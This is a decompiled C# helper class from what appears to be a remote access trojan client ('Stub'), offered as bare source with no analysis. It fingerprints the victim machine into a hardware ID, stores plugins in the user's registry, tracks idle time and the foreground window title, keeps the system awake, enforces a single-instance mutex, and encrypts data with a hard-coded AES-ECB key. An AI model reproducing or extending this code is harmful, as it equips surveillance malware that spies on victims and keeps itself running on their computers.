using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub;

[StandardModule]
internal sealed class Helper
{
	public struct LASTINPUTINFO
	{
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	private const string Alphabet = "abcdefghijklmnopqrstuvwxyz";

	public static Random Random = new Random();

	private static readonly string Plugin = "Software\\" + ID();

	public static string current = Process.GetCurrentProcess().MainModule!.FileName;

	private static int idletime;

	private static LASTINPUTINFO lastInputInf = default(LASTINPUTINFO);

	public static TimeSpan sumofidletime = new TimeSpan(0L);

	public static int LastLastIdletime;

	public static string Time;

	public static string[] userAgents = new string[3] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };

	public static Mutex _appMutex;

	public static string GetRandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder(length);
		checked
		{
			int num = length - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyz"[Random.Next("abcdefghijklmnopqrstuvwxyz".Length)]);
			}
			return stringBuilder.ToString();
		}
	}

	[DllImport("user32.dll")]
	public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

	public static int GetLastInputTime()
	{
		idletime = 0;
		lastInputInf.cbSize = Marshal.SizeOf(lastInputInf);
		lastInputInf.dwTime = 0;
		checked
		{
			if (GetLastInputInfo(ref lastInputInf))
			{
				idletime = Environment.TickCount - lastInputInf.dwTime;
			}
			if (idletime > 0)
			{
				return (int)Math.Round((double)idletime / 1000.0);
			}
			return 0;
		}
	}

	public static object LastAct()
	{
		while (true)
		{
			Thread.Sleep(1000);
			int lastInputTime = GetLastInputTime();
			if (LastLastIdletime <= lastInputTime)
			{
				Time = Conversions.ToString(GetLastInputTime());
			}
			else
			{
				sumofidletime = sumofidletime.Add(TimeSpan.FromSeconds(LastLastIdletime));
			}
			LastLastIdletime = lastInputTime;
		}
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

	public static void PreventSleep()
	{
		try
		{
			SetThreadExecutionState((EXECUTION_STATE)2147483651u);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = GetForegroundWindow();
			if (GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static string ID()
	{
		try
		{
			return GetHashT(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Err HWID";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetHashT(string strToHash)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(strToHash);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}

	public static bool SetValue(string name, byte[] value)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Plugin, RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey.SetValue(name, value, RegistryValueKind.Binary);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static byte[] GetValue(string value)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Plugin);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(value));
			return (byte[])objectValue;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public static byte[] Decompress(byte[] input)
	{
		object obj = new MemoryStream(input);
		try
		{
			byte[] array = new byte[4];
			object[] array2 = new object[3] { array, 0, 4 };
			object[] array3 = array2;
			bool[] array4 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Read", array3, (string[])null, (Type[])null, array4, true);
			if (array4[0])
			{
				array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
			}
			object obj2 = BitConverter.ToInt32(array, 0);
			object obj3 = new GZipStream((Stream)obj, CompressionMode.Decompress);
			try
			{
				object obj4 = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(obj2, (object)1)) + 1)];
				object[] array5 = new object[3]
				{
					RuntimeHelpers.GetObjectValue(obj4),
					0,
					RuntimeHelpers.GetObjectValue(obj2)
				};
				object[] array6 = array5;
				array4 = new bool[3] { true, false, true };
				NewLateBinding.LateCall(obj3, (Type)null, "Read", array6, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					obj4 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				if (array4[2])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				return (byte[])obj4;
			}
			finally
			{
				if (obj3 != null)
				{
					((IDisposable)obj3).Dispose();
				}
			}
		}
		finally
		{
			if (obj != null)
			{
				((IDisposable)obj).Dispose();
			}
		}
	}

	public static byte[] Compress(byte[] input)
	{
		object obj = new MemoryStream();
		try
		{
			object bytes = BitConverter.GetBytes(input.Length);
			object[] array = new object[3]
			{
				RuntimeHelpers.GetObjectValue(bytes),
				0,
				4
			};
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				bytes = RuntimeHelpers.GetObjectValue(array[0]);
			}
			object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress);
			try
			{
				object[] array4 = new object[3] { input, 0, input.Length };
				object[] array5 = array4;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array5, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					input = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			finally
			{
				if (obj2 != null)
				{
					((IDisposable)obj2).Dispose();
				}
			}
			return (byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
		}
		finally
		{
			if (obj != null)
			{
				((IDisposable)obj).Dispose();
			}
		}
	}

	public static byte[] AES_Encryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool CreateMutex()
	{
		_appMutex = new Mutex(initiallyOwned: false, Settings.Mutex, out var createdNew);
		return createdNew;
	}

	public static void CloseMutex()
	{
		if (_appMutex != null)
		{
			_appMutex.Close();
			_appMutex = null;
		}
	}
}
